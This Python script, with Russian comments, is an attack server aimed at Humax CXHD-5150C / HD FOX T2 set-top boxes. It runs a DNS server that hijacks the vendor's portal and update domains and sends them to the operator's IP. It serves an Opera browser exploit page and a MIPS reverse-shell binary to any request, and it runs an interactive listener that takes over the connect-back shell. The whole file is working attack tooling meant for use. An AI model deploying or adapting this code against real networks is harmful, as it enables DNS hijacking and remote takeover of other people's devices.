#!/usr/bin/env python3
"""
Attack server for Humax CXHD-5150C / HD FOX T2.
DNS hijack + HTTP exploit delivery + reverse shell listener.

Usage:
    sudo python3 server.py --ip 192.168.1.100
    sudo python3 server.py --ip 192.168.1.100 --shell-port 4444 --http-port 8080

DNS перехватывает *.humaxtvportal.com, *.humax-networks.com → наш IP.
HTTP раздаёт opera_exploit.html на любой GET-запрос.
Shell слушает connect-back от MIPS reverse shell.
"""

import argparse
import http.server
import os
import select
import socket
import struct
import sys
import threading

REDIRECT_DOMAINS = [
    b"humaxtvportal.com",
    b"test.humaxtvportal.com",
    b"humax-networks.com",
    b"update.humax-networks.com",
    b"cdn.humax-networks.com",
]


# --- DNS ---

def parse_dns_name(data, offset):
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            ptr = struct.unpack("!H", data[offset : offset + 2])[0] & 0x3FFF
            labels.extend(parse_dns_name(data, ptr)[0])
            offset += 2
            break
        labels.append(data[offset + 1 : offset + 1 + length])
        offset += 1 + length
    return labels, offset


def build_dns_response(query, ip_bytes):
    txid = query[:2]
    labels, qend = parse_dns_name(query, 12)
    qname = b".".join(labels).lower()

    should_redirect = any(qname == d or qname.endswith(b"." + d) for d in REDIRECT_DOMAINS)
    if not should_redirect or len(query) < qend + 4:
        return None, qname

    qtype = struct.unpack("!H", query[qend : qend + 2])[0]
    if qtype != 1:  # only A records
        return None, qname

    resp = bytearray()
    resp += txid
    resp += struct.pack("!H", 0x8180)  # standard response, recursion available
    resp += struct.pack("!H", 1)  # qdcount
    resp += struct.pack("!H", 1)  # ancount
    resp += struct.pack("!H", 0)  # nscount
    resp += struct.pack("!H", 0)  # arcount
    resp += query[12 : qend + 4]  # question section
    resp += b"\xc0\x0c"  # name pointer
    resp += struct.pack("!H", 1)  # type A
    resp += struct.pack("!H", 1)  # class IN
    resp += struct.pack("!I", 60)  # TTL
    resp += struct.pack("!H", 4)  # rdlength
    resp += ip_bytes
    return bytes(resp), qname


def dns_server(ip):
    ip_bytes = socket.inet_aton(ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", 53))
    except PermissionError:
        print("[DNS] ОШИБКА: нужен root (sudo) для порта 53")
        return
    print(f"[DNS] :53 — перехват → {ip}")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            resp, qname = build_dns_response(data, ip_bytes)
            if resp:
                sock.sendto(resp, addr)
                print(f"[DNS] {qname.decode()} → {ip}")
        except Exception as e:
            print(f"[DNS] ошибка: {e}")


# --- HTTP ---

EXPLOIT_DIR = os.path.dirname(os.path.abspath(__file__))


class ExploitHTTPHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve exploit page on any request
        if self.path.endswith(".png"):
            self._serve_file("exploit.png", "image/png")
        elif self.path.endswith(".svg"):
            self._serve_file("exploit.svg", "image/svg+xml")
        elif self.path.endswith(".ttf") or self.path.endswith(".otf"):
            self._serve_file(os.path.basename(self.path), "application/octet-stream")
        elif self.path == "/shell":
            self._serve_file("reverse_shell.bin", "application/octet-stream")
        else:
            self._serve_exploit()

    def _serve_exploit(self):
        path = os.path.join(EXPLOIT_DIR, "opera_exploit.html")
        if os.path.exists(path):
            with open(path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>opera_exploit.html not found</h1>")

    def _serve_file(self, name, ctype):
        path = os.path.join(EXPLOIT_DIR, name)
        if os.path.exists(path):
            with open(path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404)

    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "")
        print(f"[HTTP] {self.client_address[0]} {fmt % args}  UA: {ua[:80]}")


def http_server(port):
    server = http.server.HTTPServer(("0.0.0.0", port), ExploitHTTPHandler)
    print(f"[HTTP] :{port} — раздаёт opera_exploit.html")
    server.serve_forever()


# --- Reverse shell listener ---

def shell_listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(1)
    print(f"[SHELL] :{port} — ждём reverse shell")

    while True:
        conn, addr = sock.accept()
        print(f"\n{'='*60}")
        print(f"[SHELL] *** ПОДКЛЮЧЕНИЕ от {addr[0]}:{addr[1]} ***")
        print(f"{'='*60}")
        print("[SHELL] Интерактивный режим (Ctrl+C для выхода)\n")

        try:
            conn.setblocking(False)
            while True:
                readable, _, _ = select.select([conn, sys.stdin], [], [], 1)
                for s in readable:
                    if s is conn:
                        data = conn.recv(4096)
                        if not data:
                            raise ConnectionError("closed")
                        sys.stdout.write(data.decode("utf-8", errors="replace"))
                        sys.stdout.flush()
                    elif s is sys.stdin:
                        cmd = sys.stdin.readline()
                        if cmd:
                            conn.sendall(cmd.encode())
        except (ConnectionError, KeyboardInterrupt):
            print(f"\n[SHELL] Соединение с {addr[0]} закрыто")
            conn.close()


# --- Main ---

def main():
    parser = argparse.ArgumentParser(description="Humax CVE attack server")
    parser.add_argument("--ip", required=True, help="Наш IP в сети приставки")
    parser.add_argument("--http-port", type=int, default=80, help="HTTP порт (default: 80)")
    parser.add_argument("--shell-port", type=int, default=4444, help="Shell порт (default: 4444)")
    parser.add_argument("--no-dns", action="store_true", help="Не запускать DNS")
    args = parser.parse_args()

    print(f"=== Humax Attack Server ===")
    print(f"IP: {args.ip}  HTTP: {args.http_port}  Shell: {args.shell_port}")
    print(f"Exploit: {os.path.join(EXPLOIT_DIR, 'opera_exploit.html')}")
    print()

    threads = []

    if not args.no_dns:
        t = threading.Thread(target=dns_server, args=(args.ip,), daemon=True)
        t.start()
        threads.append(t)

    t = threading.Thread(target=http_server, args=(args.http_port,), daemon=True)
    t.start()
    threads.append(t)

    # Shell listener runs in main thread (for interactive I/O)
    try:
        shell_listener(args.shell_port)
    except KeyboardInterrupt:
        print("\n[*] Выход")


if __name__ == "__main__":
    main()
